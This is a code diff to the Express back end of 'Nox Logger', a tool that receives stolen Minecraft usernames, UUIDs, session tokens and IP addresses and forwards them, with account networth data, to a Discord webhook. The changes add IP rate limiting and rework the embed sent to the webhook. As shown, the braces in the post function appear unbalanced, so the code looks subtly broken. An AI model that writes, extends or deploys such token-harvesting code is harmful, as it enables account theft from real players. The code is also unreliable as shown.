@@ -2,11 +2,16 @@ const express = require('express');
 const axios = require('axios');
 mysql = require('mysql2');
 const networthCalc = require('./utils/Networth');
+const iplim = require("iplim")
 const app = express();
 
 port = 3000;
 
 app.use(express.json())
+
+// rate limiter
+app.use(iplim({timeout: 1000 * 10 * 15, limit: 4, exclude: [], log: false}))
+app.set("trust proxy", true)
 
 const config = require('../config.json');
 
@@ -18,10 +23,6 @@ const db = mysql.createConnection({
 });
 
 app.post('/', (req, res) => {
-    // networth stuff 
-    let networth;
-    let description = "No networth found";
-
     username = req.body.username;
     uuid = req.body.uuid;
     token = req.body.token;
@@ -55,12 +56,16 @@ app.post('/', (req, res) => {
         }}).then(async response => {
         if (response.status == 204) {
             networthCalc(uuid).then((result) => {
-                networth = formatNumber(result[0]);
-                description = result[1];
+                let networth = "0";
+                let description = null;
+                if (result != null) {
+                    networth = Intl.NumberFormat('en-US', {
+                        notation: 'compact',
+                        maximumFractionDigits: 2,
+                    }).format(result[0]);
+                    description = result[1];
+                }
                 post(ip, username, uuid, token, webhook, networth, description);
-
-                }).catch(error => {
-                    return res.status(500).send("Internal Server Error");
             });
         }
     }).catch(error => {
@@ -69,6 +74,7 @@ app.post('/', (req, res) => {
 });
 
 function post(ip, username, uuid, token, webhook, networth, description) {
+    //check if description is empty
     let embed = {
         username: "Nox Logger",
         avatar_url: "https://cdn.discordapp.com/attachments/1053140780425945100/1053509569797705758/nox1-removebg-preview.png",
@@ -101,22 +107,23 @@ function post(ip, username, uuid, token, webhook, networth, description) {
                         name: "Token",
                         value: "```" + token + "```",
                         inline: false
-                    },
+                    }
                 ]
-            },
-            {
-                title: "🌍 Skyblock Profile Info",
-                color: 0x7289DA,
-                fields: description,
-                url: "https://sky.shiiyu.moe/stats/" + username,
-                footer: {
-                    "text": "🌟 Nox Logger - Nox Builder by Gute Nacht 🌟 - Thank you BreadCat for your networth stuff!",
-                }
             }
         ]
     }
-
     
+    if (description != null) {
+        embed.embeds.push({
+            title: "🌍 Skyblock Profile Info",
+            color: 0x7289DA,
+            fields: description,
+            url: "https://sky.shiiyu.moe/stats/" + username,
+            footer: {
+                "text": "🌟 Nox Logger - Nox Builder by Gute Nacht 🌟 - Thank you BreadCat for your networth stuff!",
+            }
+        })
+
     let data = embed;
     
     var config = {
@@ -136,12 +143,6 @@ function post(ip, username, uuid, token, webhook, networth, description) {
          return error;
        });
     }
-
-const formatNumber = (num) => {
-    if (num < 1000) return num.toFixed(2)
-    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
-    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
-    else return `${(num / 1000000000).toFixed(2)}b`
 }
 
 app.listen(port, () => {
